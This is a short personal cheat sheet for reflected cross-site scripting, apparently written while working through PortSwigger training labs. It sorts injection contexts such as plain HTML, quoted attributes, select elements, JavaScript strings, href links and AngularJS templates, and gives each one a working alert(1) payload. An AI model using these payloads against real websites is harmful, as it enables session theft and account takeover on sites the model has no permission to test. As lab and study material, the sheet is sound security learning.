# XSS Cheat Sheet

## The method (ask this every time)

1. Type a random word like `zzzzzz123` into the input
2. Right-click near where it shows up, click Inspect
3. Find your word in the code, look at what's immediately around it, that's
   the "house" it's sitting in
4. Match the house to the trick below

## Houses and tricks

### House: plain in the page, nothing special around it

Your word just shows up as normal text on the page.

```html
<p>You searched for: zzzzzz123</p>
```

Trick: just inject a script tag directly, nothing to escape first

```
<script>alert(1)</script>
```

### House: inside a quoted HTML attribute

Your word is sitting inside `"..."` as part of some tag's attribute.

```html
<img src="zzzzzz123">
```

Trick: close the quote and the tag, then start a fresh element

```
"><svg onload=alert(1)>
```

### House: inside a quoted attribute, but angle brackets are blocked

Same as above, but `<` and `>` get encoded if you try to use them.

```html
<input value="zzzzzz123">
```

Trick: stay inside the attribute, close it with a quote, then open a brand new
attribute with its own event handler, no angle brackets needed

```
"onmouseover="alert(1)
```

### House: inside a box element like select or option

Your word is one of the options in a dropdown.

```html
<select><option>zzzzzz123</option></select>
```

Trick: close the whole box first, then start a new, independent element after it

```
"></select><img src=1 onerror=alert(1)>
```

### House: inside a JavaScript string

Your word is sitting inside quotes, but inside a `<script>` block, not plain HTML.

```html
<script>var searchTerm = 'zzzzzz123';</script>
```

Trick: close the JavaScript string with a quote, run your own statement, then
patch the rest of the line so it doesn't break

```
'-alert(1)-'
```

### House: an href link (anchor tag)

Your word becomes part of a link's destination.

```html
<a href="zzzzzz123">click here</a>
```

Trick: replace the whole value with a javascript: URL, no need to break out of
anything, it runs when the link is clicked

```
javascript:alert(1)
```

### House: a page using double curly braces anywhere, {{ }}

This usually means a framework like AngularJS is reading that text as code, not
plain text, even with no HTML tags involved.

```html
<div ng-app>zzzzzz123</div>
```

Trick: speak the framework's own expression syntax instead of HTML

```
{{$on.constructor('alert(1)')()}}
```

## Notes

- Always do step 1 (random word) and step 2 (inspect it) first. Never guess a
  payload before seeing the actual house
- Houses above are only the ones tested so far, in these PortSwigger labs. New
  houses get added here as they come up
- Tested by me: all houses above, each one in its matching lab
